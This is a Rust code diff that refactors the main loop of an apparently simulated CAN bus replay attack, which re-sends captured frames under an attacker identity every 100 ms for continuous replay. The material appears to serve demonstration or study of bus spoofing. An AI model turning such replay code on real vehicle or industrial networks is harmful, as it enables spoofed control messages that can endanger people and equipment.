@@ -131,29 +131,24 @@ async fn main() -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
 
     let mut replay_count = 0;
 
-    loop {
-        if let Some(frame) = captured_frames.pop_front() {
-            // Replay the frame with attacker's identity
-            let replayed_frame =
-                CanFrame::new(frame.id, frame.data.clone(), ATTACKER_NAME.to_string());
+    while let Some(frame) = captured_frames.pop_front() {
+        // Replay the frame with attacker's identity
+        let replayed_frame = CanFrame::new(frame.id, frame.data.clone(), ATTACKER_NAME.to_string());
 
-            writer.send_frame(replayed_frame).await?;
+        writer.send_frame(replayed_frame).await?;
 
-            replay_count += 1;
-            println!(
-                "{} Replayed frame #{} (originally from {})",
-                "⚡".red(),
-                replay_count,
-                frame.source.bright_black()
-            );
+        replay_count += 1;
+        println!(
+            "{} Replayed frame #{} (originally from {})",
+            "⚡".red(),
+            replay_count,
+            frame.source.bright_black()
+        );
 
-            // Add captured frame back to queue for continuous replay
-            captured_frames.push_back(frame);
+        // Add captured frame back to queue for continuous replay
+        captured_frames.push_back(frame);
 
-            tokio::time::sleep(Duration::from_millis(100)).await;
-        } else {
-            break;
-        }
+        tokio::time::sleep(Duration::from_millis(100)).await;
 
         if replay_count >= 100 {
             // Rotate to beginning
